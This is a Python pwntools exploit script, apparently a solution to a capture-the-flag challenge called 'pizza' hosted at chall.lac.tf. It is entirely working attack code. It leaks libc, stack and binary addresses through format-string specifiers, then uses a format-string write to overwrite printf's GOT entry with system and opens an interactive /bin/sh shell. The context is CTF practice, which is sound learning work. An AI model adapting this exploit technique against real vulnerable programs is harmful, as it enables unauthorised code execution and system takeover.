#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pizza'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
host, port = 'chall.lac.tf', 31134

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', b'%5$p')
    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', b'%3$p')
    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', b'%49$p')
    io.recvuntil(b'chose:\n')

    libc_leak = io.recvline().strip().decode()
    stack_leak = io.recvline().strip().decode()
    elf_leak = io.recvline().strip().decode()
    elf.address = int(elf_leak, 16) - 0x1189
    libc.address = int(libc_leak, 16) - 0x1d2a80
    rip = int(stack_leak, 16) - 0x858
    rbp = int(stack_leak, 16) - 0x850

    log.info('ELF base: %#x', elf.address)
    log.info('LIBC base: %#x', libc.address)
    log.info('RBP addr: %#x', rbp)
    log.info('RIP addr: %#x', rip)

    io.sendlineafter(b':', b'y')

    payload = fmtstr_payload(6, {elf.got['printf'] : libc.sym['system']}, write_size='short')
    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', payload)
    io.sendline(b'/bin/sh')
    io.interactive()
    
if __name__ == '__main__':
    exploit()